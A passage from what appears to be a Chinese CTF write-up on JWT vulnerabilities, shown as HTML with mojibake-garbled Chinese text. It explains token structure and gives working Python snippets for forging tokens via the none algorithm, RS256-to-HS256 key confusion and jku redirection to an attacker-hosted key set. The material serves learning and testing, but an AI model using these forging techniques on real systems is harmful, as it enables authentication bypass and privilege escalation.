class="comment">//ç­¾å‘æ—¶é—´</span></span><br><span class="line">    <span class="attr">"exp"</span>: <span class="number">1573940267</span>,        <span class="comment">//è¿‡æœŸæ—¶é—´</span></span><br><span class="line">    <span class="attr">"nbf"</span>: <span class="number">1573440582</span>,         <span class="comment">//è¯¥æ—¶é—´ä¹‹å‰ä¸æ¥æ”¶å¤„ç†è¯¥Token</span></span><br><span class="line">    <span class="attr">"domain"</span>: <span class="string">"example.com"</span>,   <span class="comment">//é¢å‘çš„ç”¨æˆ·</span></span><br><span class="line">    <span class="attr">"jti"</span>: <span class="string">"dff4214121e83057655e10bd9751d657"</span>   <span class="comment">//Tokenå”¯ä¸€æ ‡è¯†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>å…¶ä¸­å¤§éƒ¨åˆ†å˜é‡éƒ½æ˜¯å¯ä»¥é€‰æ‹©æ€§ç”Ÿæˆçš„ã€‚æœ‰çš„è¯­è¨€çš„jwtåº“ä¼šè‡ªåŠ¨ç”Ÿæˆiatå˜é‡ï¼Œä½†æ˜¯è¿™äº›éƒ½æ— ä¼¤å¤§é›…ã€‚å¾€å¾€æœ€é‡è¦çš„ï¼Œæ˜¯å½“payloadå­˜å‚¨äº†è‡ªå®šä¹‰çš„æ•æ„Ÿä¿¡æ¯æ—¶ã€‚æ¯”å¦‚usernameä¹‹ç±»çš„ã€‚</li></ul><p>ç”±äºjwtå­˜å‚¨ä¿¡æ¯æ—¶ï¼Œheader+payloadçš„jsonæ•°æ®æ˜¯ç›´æ¥é€šè¿‡base64è¿›è¡Œç¼–ç å­˜å‚¨çš„ã€‚å› æ­¤æˆ‘ä»¬ä¸€å®šå¯ä»¥ä»payloadä¸­å‘ç°<strong>ä¿¡æ¯æ³„éœ²</strong>ã€‚</p><p>ä½†æ˜¯ä»æ¼æ´åˆ©ç”¨è§’åº¦æ¥è®²ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦è¾¾æˆè¶Šæƒçš„ç›®çš„ï¼Œå°±å¿…é¡»å¾—æåˆ°å…¶signatureéƒ¨åˆ†ã€‚</p><ul><li>Signature</li></ul><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯é€šè¿‡å‰é¢æŒ‡å®šçš„ç®—æ³•ï¼Œå»ç”Ÿæˆå¯¹åº”çš„sig.<br>è¿™é‡Œæˆ‘ä»¥HS256ä¸ºä¾‹ï¼Œä»ä¼ªä»£ç çš„è§’åº¦è®²ã€‚æ˜¯è¿™æ ·ç”Ÿæˆçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">'secretkey'</span>  </span><br><span class="line">unsignedToken = encodeBase64(header) + <span class="string">'.'</span> + encodeBase64(payload)  </span><br><span class="line">signature = HMAC-SHA256(key, unsignedToken)</span><br></pre></td></tr></table></figure><p>å¯è§ï¼Œå…¶æ€è·¯å°±æ˜¯ç”¨<code>HMAC-sha256</code>ï¼ˆå¯¹ç§°åŠ å¯†ç®—æ³•ï¼‰ï¼Œå¯¹jwtå‰ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆçš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†ã€‚</p><p>ä½†æ˜¯å®é™…ä¸Šï¼Œå¤§å®¶å¯èƒ½æ³¨æ„åˆ°è¿‡ä¸€ä¸ªç°è±¡ï¼šjwtä¸­æ²¡æœ‰<code>/</code>,<code>=</code>è¿™ç§æœ¬è¯¥å‡ºç°åœ¨base64æ•°æ®ä¸­çš„å­—ç¬¦ã€‚è€Œåœ¨ä¹‹å‰æåˆ°è¿‡çš„æ¯”èµ›ä¸­ï¼Œæˆ‘ä¹Ÿæ˜¯é‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¹¶é€šè¿‡æ‰¾è§„å¾‹å‘ç°ï¼Œjwtæœ€ç»ˆçš„ç»“æœä¼šå°†åŸå§‹çš„base64å­—ç¬¦ä¸²ä¸­çš„<code>/</code>æ¢æˆ<code>_</code>ã€‚å¹¶ä¸”å»æ‰åŸæœ¬base64ä¸­ç”¨äºè¡¥ä½çš„<code>=</code>ã€‚</p><p>å®é™…ä¸Šï¼Œè¿™ç‚¹æˆ‘ä»¬å¯ä»¥ç”¨pythonçš„åº“ä¸­<code>base64.urlsafe_b64encode</code>æ›¿æ¢<code>base64encode</code>.ä¹Ÿå› æ­¤å¯ä»¥ç†è§£ï¼Œæ˜¯ä¸ºäº†ç½‘ç»œä¼ è¾“æ‰å¯¹è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†å¤„ç†ã€‚</p><p>è‡³äºå¦ä¸€ç§å¸¸è§çš„RS256ç®—æ³•ä¹Ÿæ˜¯ç›¸åŒçš„é“ç†ã€‚æœåŠ¡ç«¯éœ€è¦å­˜å‚¨ä¸€ç»„<code>publickey.pem</code>ä¸<code>privatekey.pem</code>.æˆ‘ä»¬éœ€è¦ç§é’¥ç”Ÿæˆtoken.æœåŠ¡ç«¯åˆ™ä¼šç”¨å…¬é’¥è§£å¯†tokenã€‚</p><h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨æ¼æ´æ¸—é€jwtäº†ã€‚é¦–å…ˆéœ€è¦æ˜ç¡®ä¸¤ç‚¹</p><ul><li>æ˜¯å¦éœ€è¦åˆ©ç”¨jwtï¼Ÿ</li><li>æ˜¯å¦æœ‰å…¶ä»–æ¼æ´æ³„éœ²key?</li></ul><p>ä¹‹æ‰€ä»¥æåˆ°è¿™ä¸¤ç‚¹æ˜¯å› ä¸ºï¼šjwtæœ¬èº«å°±æ˜¯å› ä¸ºåªç”¨æœåŠ¡ç«¯å­˜å‚¨ä¸€ç»„keyæ¥å‡è½»å‹åŠ›è€Œè¯ç”Ÿçš„ã€‚æ˜¯å¯ä»¥ä½œä¸ºsessionidçš„æ›¿æ¢æ–¹æ¡ˆçš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸»æµçš„ç¼–ç¨‹è¯­è¨€python,java,Node.jséƒ½å¯ä»¥å¾ˆè½»æ¾çš„è°ƒç”¨jwt.å…¶ä»–è¯­è¨€å¦‚phpä¹Ÿæ”¯æŒã€‚è€ŒçœŸå®æƒ…å†µå¾€å¾€æ˜¯ä»–ä»¬è°ƒç”¨jwtæ¥å­˜å‚¨å¿…è¦çš„ç®€å•ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥<strong>ä¸è¦è®¤ä¸ºjwtä¸€å®šæœ‰æ¼æ´å¯åˆ©ç”¨</strong></p><p>åŒæ—¶ï¼Œjwtçš„keyä¹Ÿæ˜¯éå¸¸å¤´ç–¼çš„ä¸€ä¸ªè¯é¢˜ã€‚å¦‚æœéœ€è¦è¶Šæƒï¼Œé‚£ä¹ˆå°±éœ€è¦ä¼ªé€ token.è€Œä¼ªé€ å¿…é¡»éœ€è¦keyæ¥ç­¾åï¼ˆæˆ–è€…æœåŠ¡ç«¯è„šæœ¬æ¼æ´ï¼‰ã€‚ä¹Ÿè®¸æ˜¯å—äº†å›½èµ›å½±å“ï¼Œjwtçš„keyæ˜¯ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>æš´ç ´çš„.è€Œå®é™…æƒ…å†µä¸‹ï¼Œkeyå¾ˆæœ‰å¯èƒ½éš¾ä»¥çˆ†ç ´ï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºæœ€ä½³æ–¹æ¡ˆæ˜¯å…ˆå»å¯»æ‰¾å¯èƒ½æ³„éœ²keyçš„æ–¹æ³•ã€‚</p><p>æ¯”å¦‚æŸæ¯”èµ›æˆ‘åœ¨getshellåï¼Œæ‰’ä¸‹æºç æ—¶é¡ºæ‰‹çœ‹äº†ä¸€çœ¼å®ƒæœåŠ¡ç«¯çš„keyï¼Œæ ¹æœ¬ä¸å¯èƒ½çˆ†ç ´<br><img src="/2020/06/24/Make-jwt-great-again/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥ï¼Œ<strong>å°è¯•å…¶ä»–æ–¹å¼æ¥è·å–key</strong>ã€‚è¿™ä¹Ÿæ­£æ˜¯æˆ‘ä¸‹é¢è¦æ€»ç»“çš„ï¼Œç”¨äºjwtçš„æ¼æ´åˆ©ç”¨ã€‚</p><h3 id="ä¿¡æ¯æ³„éœ²-ä¼ªé€ "><a href="#ä¿¡æ¯æ³„éœ²-ä¼ªé€ " class="headerlink" title="ä¿¡æ¯æ³„éœ²-ä¼ªé€ "></a>ä¿¡æ¯æ³„éœ²-ä¼ªé€ </h3><p>å¿…å¤‡ç½‘ç«™ï¼š<br><a href="http://jwt.io/" target="_blank" rel="noopener">http://jwt.io/</a><br>è¿™ä¹Ÿæ˜¯æ‰€æœ‰jwté¢˜ç›®ç¬¬ä¸€æ­¥å°±è¯¥åšçš„ã€‚å› ä¸ºå³ä½¿æ²¡æœ‰keyï¼Œæˆ‘ä»¬ä¹Ÿèƒ½æ¸…æ™°çš„å¾—åˆ°æ‰€æœ‰headerä¸payloadçš„ä¿¡æ¯ã€‚è€Œå¾€å¾€è¿™å†³å®šäº†æˆ‘ä»¬ä¸‹ä¸€æ­¥çš„ä¸¾æªã€‚</p><p>æ¯”å¦‚ï¼Œpayloadä¸­æœ‰usernameå­—æ®µã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥ä¼ªé€ adminæ¥è¿›è¡Œæƒé™æå‡å‘¢ï¼Ÿæˆ–è€…ï¼Œåº”ç”¨æœ‰æŸä¸ªå˜é‡å­—æ®µå–è‡ªjwt,é‚£ä¹ˆæˆ‘ä»¬å¦‚æœæœ‰äº†key.å°±å¯ä»¥ä½¿ç”¨jwt.ioæˆ–è€…pythonè„šæœ¬è¿›è¡Œä¼ªé€ äº†ã€‚</p><p>ä»¥ä»Šå¹´ç½‘é¼ç„æ­¦ç»„çš„js_onä¸ºä¾‹ã€‚å½“ä»¥å¼±å£ä»¤ç™»å½•adminæ—¶ï¼Œå°±å¯ä»¥å¾—åˆ°keyã€‚ä»è€Œä»»æ„æ”¹é€ å­˜åœ¨sqlæ³¨å…¥çš„å­—æ®µè¿›è¡Œç›²æ³¨ã€‚è¿™ä¹Ÿå°±è¦æ±‚æˆ‘ä»¬ä½¿ç”¨è„šæœ¬æ¥å®Œæˆæ”»å‡»ã€‚ä¸‹é¢ç»™å‡ºä¸€ä¸ªpythonè°ƒç”¨jwtåŸºæœ¬ç”¨æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">encoded_jwt = jwt.encode(&#123;<span class="string">'user_name'</span>: <span class="string">'admin'</span>&#125;, <span class="string">'secretkey'</span>, algorithm=<span class="string">'HS256'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(encoded_jwt)</span><br></pre></td></tr></table></figure><p>æ³¨æ„pythonè°ƒç”¨jwtçš„åº“æ˜¯<code>PyJwt</code>ã€‚å¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªå‘ç‚¹æ˜¯ï¼Œpythonæƒ³è¦ç”¨ç§é’¥ä½œä¸ºkeyï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨RS256ç®—æ³•åŠ å¯†æ—¶ä¼šæŠ¥é”™ã€‚ä¸çŸ¥é“æ˜¯å¦åªæœ‰æˆ‘å‡ºç°è¿™ä¸ªé—®é¢˜ã€‚å› æ­¤è¿˜æ˜¯å¾—ç”¨<code>jwt.io</code>è§£å†³</p><h3 id="None-algorithm"><a href="#None-algorithm" class="headerlink" title="None-algorithm"></a>None-algorithm</h3><p>jwtæ”¯æŒç©ºç®—æ³•ï¼Œä¹Ÿå°±æ˜¯<code>None</code>ã€‚åŸæœ¬åªæ˜¯ä¸ºäº†è°ƒè¯•ç”¨çš„ï¼Œä½†è¿™ä¸€æ—¦å‡ºç°åœ¨äº†æºç ä¸­å°†æ˜¯éå¸¸è‡´å‘½çš„ã€‚</p><p>æ¯”å¦‚ä¹‹å‰è™ç¬¦æ¯”èµ›çš„é¢˜ç›®ã€‚åº”è¯¥æ˜¯å€Ÿé‰´äº†å¤–å›½èµ›çš„ä¸€ä¸ªé¢˜ã€‚å…¶æºç æ˜¯è¿™æ ·çš„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(cookie.split(<span class="string">"."</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"><span class="keyword">if</span>(sid==<span class="literal">undefined</span>||sid&gt;=secrets.length||sid&lt;<span class="number">0</span>)&#123;<span class="keyword">throw</span> <span class="string">"invalid sid"</span>&#125;</span><br><span class="line"><span class="keyword">let</span> decoded = jwt.verify(cookie, secrets[sid]);</span><br><span class="line"><span class="keyword">if</span>(decoded.perms==<span class="string">"admin"</span>)&#123;</span><br><span class="line">    res.locals.flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œå½“æ²¡æœ‰å¼ºè°ƒç®—æ³•ï¼Œç›´æ¥ä½¿ç”¨<code>jwt.verify()</code>æ—¶ï¼Œç”±äºkeyå¯æ§ï¼Œjwtæ˜¯å¯ä»¥ç”¨Noneç®—æ³•æ¥è§£tokençš„ã€‚è¿™ä¹Ÿå°±å¯¼è‡´äº†ç®€å•çš„è¶Šæƒã€‚<br>åŒç†ã€‚pythonçš„æºç å¦‚æœæ²¡æœ‰å¼ºè°ƒï¼Œä¹Ÿæ˜¯å­˜åœ¨ç©ºç®—æ³•ä¼ªé€ çš„ã€‚æ‰€ä»¥æœ‰æ—¶å€™ä¸å¦¨å°è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ— ç®—æ³•èƒ½ä¸èƒ½é€šè¿‡æœåŠ¡ç«¯æ ¡éªŒï¼ˆæ²¡æœ‰æºç æ—¶ï¼‰</p><p>é€šå¸¸æ­¥éª¤å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwtToken= <span class="string">'eyJhbGciOiJIUzI1NiIsI...'</span></span><br><span class="line"></span><br><span class="line">decodedToken= jwt.decode(jwtToken, verify=<span class="literal">False</span>)  <span class="comment"># Need to decode the token before encoding with type 'None'</span></span><br><span class="line">noneEncoded= jwt.encode(decodedToken, key=<span class="string">''</span>, algorithm=<span class="literal">None</span>)</span><br><span class="line">print(noneEncoded.decode())</span><br></pre></td></tr></table></figure><h3 id="RS256-to-HS256"><a href="#RS256-to-HS256" class="headerlink" title="RS256 to HS256"></a>RS256 to HS256</h3><p>ä»éå¯¹ç§°åˆ°å¯¹ç§°ç®—æ³•çš„ä¼ªé€ ã€‚å…¶å®éå¸¸æœ‰æ„æ€ä½†æ˜¯å›½å†…CTFéƒ½æ²¡æ€ä¹ˆè§åˆ°è¿‡ã€‚</p><p>ç›´æ¥ä¸ŠçœŸé¢˜æºç ï¼Œåº”è¯¥æ˜¯ä¹‹å‰HSCTFé‡Œé¢çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”Ÿæˆtoken</span></span><br><span class="line">auth = jwt.encode(&#123;<span class="string">"auth"</span>: <span class="string">"guest"</span>&#125;, PRIVATE_KEY, algorithm=<span class="string">"RS256"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨tokenéªŒè¯èº«ä»½æ˜¯å¦ä¸ºadmin</span></span><br><span class="line">admin = jwt.decode(auth, PUBLIC_KEY)[<span class="string">"auth"</span>] == <span class="string">"admin"</span></span><br></pre></td></tr></table></figure><p>ä¹ä¸€çœ‹æ²¡ä»€ä¹ˆæ¼æ´ã€‚ä½†æ˜¯å¦‚æœäº†è§£jwtï¼Œå°±ä¼šå‘ç°è¿™é‡Œå¯èƒ½å­˜åœ¨ä½¿ç”¨<code>HS256</code>æ›¿æ¢<code>RS256</code>çš„é£é™©ã€‚å‡å¦‚å…¬é’¥æ³„éœ²ï¼Œæˆ‘ä»¬å°±èƒ½ç”¨å…¬é’¥ä½œä¸ºkeyï¼Œä½¿ç”¨HS256ç”Ÿæˆtokené€šè¿‡æ ¡éªŒã€‚è¿™åŒæ ·æ˜¯æ²¡æœ‰å¼ºè°ƒç®—æ³•çš„é—®é¢˜ã€‚</p><p>ä¼ªé€ çš„è¯å¯ä»¥ç”¨python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = open(<span class="string">'public.pem'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(public)</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"test"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>)).decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>ä½†éœ€è¦æ³¨æ„ï¼Œè¿™é‡Œå¿…é¡»æ»¡è¶³pyjwt==0.4.3æ‰èƒ½ä¼ªé€ ã€‚å¦åˆ™åªèƒ½é‡‡ç”¨å…¶ä»–åŠæ³•äº†ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºpayloadallthethingsé‡Œçš„é“¾æ¥<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signatureâ€”rs256-to-hs256</a></p><p>è€ŒNode.jsä¹Ÿå­˜åœ¨è¿™ç§é£é™©ã€‚æ‰€ä»¥è¯´jwtçš„å®‰å…¨é—®é¢˜ä¸»è¦å‡ºåœ¨å¼€å‘è€…æºç å†™çš„ä¸å¤Ÿå¥½çš„åŸå› ã€‚</p><h3 id="jku-jwk"><a href="#jku-jwk" class="headerlink" title="jku/jwk"></a>jku/jwk</h3><p>ä»¥ä¸Šéƒ½æ˜¯ç›¸å¯¹æ¯”è¾ƒå¸¸è§çš„æ¼æ´äº†ã€‚ç”šè‡³å›½å†…ctfè¿˜åªå‡ºç°è¿‡å‰ä¸¤ç§ã€‚è€ŒNahamconçš„æ¯”èµ›è®©æˆ‘äº†è§£åˆ°äº†å¦ä¸€ç§å­˜åœ¨çš„æ¼æ´ã€‚ä¸jkuç›¸å…³ã€‚</p><blockquote><p>JKUå…¨ç§°æ˜¯â€œJWKSet URLâ€ï¼Œå®ƒæ˜¯å¤´éƒ¨çš„ä¸€ä¸ªå¯é€‰å­—æ®µï¼Œç”¨äºæŒ‡å®šé“¾æ¥åˆ°ä¸€ç»„åŠ å¯†tokenå¯†é’¥çš„URLã€‚è‹¥å…è®¸ä½¿ç”¨è¯¥å­—æ®µä¸”ä¸è®¾ç½®é™å®šæ¡ä»¶ï¼Œæ”»å‡»è€…å°±èƒ½æ‰˜ç®¡è‡ªå·±çš„å¯†é’¥æ–‡ä»¶ï¼Œå¹¶æŒ‡å®šåº”ç”¨ç¨‹åºï¼Œç”¨å®ƒæ¥è®¤è¯tokenã€‚</p></blockquote><p>è€Œjwkå°±æ˜¯json web keyã€‚</p><p>å®é™…ä¸Šä½ èƒ½å‘ç°amazonå°±æœ‰ç›¸å…³çš„æ–‡æ¡£æ¥äº†è§£jkuã€‚<br><a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html</a></p><p>å…¶ä¸­è¿˜æåˆ°äº†kidè¿™ä¸ªheaderé€‰é¡¹ã€‚å®ƒçš„ä½œç”¨æ˜¯è·å–å¯¹åº”çš„å­—æ®µä½œä¸ºkeyã€‚(jwkç±»å‹)</p><p>ä¸‹é¢æˆ‘ç”¨æ¯”èµ›ä¸­flagjokesè¿™é¢˜æ¥è®²è§£ä¸‹ï¼š</p><p>é¦–å…ˆè§£å‡ºjwt headerå¦‚ä¸‹ï¼Œè€Œæˆ‘ä»¬åªè¦payloadä¸­çš„usernameä¸ºadminå³å¯è·å¾—flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;jku&quot;: &quot;http:&#x2F;&#x2F;localhost:5000&#x2F;static&#x2F;jwks.json&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jkuæŒ‡å‘äº†æœ¬åœ°çš„ç½‘é¡µã€‚é‚£ä¹ˆå°è¯•ç›´æ¥è®¿é—®<br>å‘ç°ç½‘é¡µå­˜åœ¨static/jwks.json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;keys&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">&quot;e&quot;: &quot;AQAB&quot;,</span><br><span class="line">    &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;,</span><br><span class="line">    &quot;kty&quot;: &quot;RSA&quot;,</span><br><span class="line">    &quot;n&quot;: &quot;1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q&quot;</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘å‘ç°å¾—åˆ°jwkåï¼Œå³å¯ç”Ÿæˆå…¬é’¥äº†ã€‚ä½†æ˜¯ç½‘ç«™åªæ³„éœ²äº†å…¬é’¥ï¼Œé‚£ä¹ˆæ ¹æ®ä¸Šé¢æ€»ç»“çš„ï¼Œèƒ½å°è¯•çš„åªèƒ½æ˜¯HS256æ›¿æ¢RS256ç”Ÿæˆtoken.<br>ç„¶è€Œå½“æ—¶å°è¯•äº†åå´å¾—åˆ°æœåŠ¡ç«¯çš„æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´å¹¶ä¸èƒ½æ›´æ¢ç®—æ³•æ¥ä¼ªé€ token.é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>æ­¤æ—¶é€šè¿‡æŸ¥è¯¢ä¸€ç³»åˆ—èµ„æ–™ï¼Œç»ˆäºå‘ç°jkuçš„æŒ‡å®šæ˜¯æœ‰æ´çš„ã€‚å‡å¦‚æˆ‘ä»¬è®©å®ƒåŠ è½½åˆ°æˆ‘ä»¬è‡ªå·±çš„<code>jwk.json</code>ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿä»¥<code>RS256</code>ç®—æ³•è€Œä¸æ˜¯ä¼ªé€ <code>HS256</code>é€šè¿‡æ ¡éªŒäº†ã€‚</p><p>æ‰€ä»¥ï¼Œæ­£ç¡®æ€è·¯æ˜¯ç”³è¯·ä¸€ç»„keyï¼Œkidå¯ä»¥è‡ªå®š<br><a href="https://mkjwk.org/" target="_blank" rel="noopener">https://mkjwk.org/</a><br><img src="/2020/06/24/Make-jwt-great-again/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆ‘ä»¬å¯ä»¥åªæ”¾ä¸­é—´çš„ä½œä¸ºjwk.jsonï¼Œä¹Ÿå¯ä»¥æŠŠå³è¾¹çš„å…¬é’¥æ”¹æˆjwkçš„æ ¼å¼ã€‚</p><p>ä¹‹åå°±æ˜¯åœ¨çº¿æˆ–è€…ç”¨è„šæœ¬è¿›è¡Œjwk-&gt;pemçš„è½¬æ¢äº†ã€‚è¿™é‡Œè´´å‡ºä¸€ä¸ªNode.jsè¿›è¡Œè½¬æ¢çš„è„šæœ¬ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jose = <span class="built_in">require</span>(<span class="string">'node-jose'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> key = fs.readFileSync(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DUMP_PRIVATE_KEY = (<span class="string">'true'</span> == args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">jose.JWK.asKey(key)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key.toPEM(DUMP_PRIVATE_KEY));</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ—¶ å‘ç°<code>node test.js private.jwk</code>è·Ÿ <code>public.jwk</code>ä¸€è‡´ï¼Œè¯æ˜æ²¡æœ‰é—®é¢˜ã€‚æ­¤æ—¶åªéœ€ä½¿ç”¨<br><code>node test.js private.jwk TRUE</code>å³å¯è¾“å‡ºç§é’¥ç»“æœï¼Œå¦åˆ™è„šæœ¬è®¾è®¡ä¸Šæ˜¯é»˜è®¤ä¸è¾“å‡ºç§é’¥çš„ï¼ˆå±é™©ï¼‰ã€‚</p><p>å› æ­¤ã€‚æœ¬é¢˜å…³é”®æ˜¯æ›´æ”¹jkuè·å–åˆ°æˆ‘ä»¬è‡ªå·±çš„jsonã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥ç”¨ç§é’¥åŠ å¯†payload.æœåŠ¡ç«¯ç”¨è·å–åˆ°çš„å…¬é’¥è§£å¯†payload.</p><h3 id="kid-ä»»æ„æ–‡ä»¶"><a href="#kid-ä»»æ„æ–‡ä»¶" class="headerlink" title="kid-ä»»æ„æ–‡ä»¶"></a>kid-ä»»æ„æ–‡ä»¶</h3><p>kidçš„å«ä¹‰ä¸Šé¢å·²ç»æåˆ°è¿‡äº†ï¼šæŒ‡å®šjwtçš„å¯†é’¥ã€‚</p><p>kidå¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼Œåœ¨äº†è§£äº†ä¸Šé¢jkuçš„ç›¸å…³æ¼æ´åï¼Œåº”è¯¥ä¼šæ¯”è¾ƒæ¸…æ¥šäº†ã€‚å¦‚æœjwtæ˜¯é€šè¿‡headerä¸­çš„kidæ¥è·å–keyï¼Œé‚£ä¹ˆå°±å¯èƒ½é€ 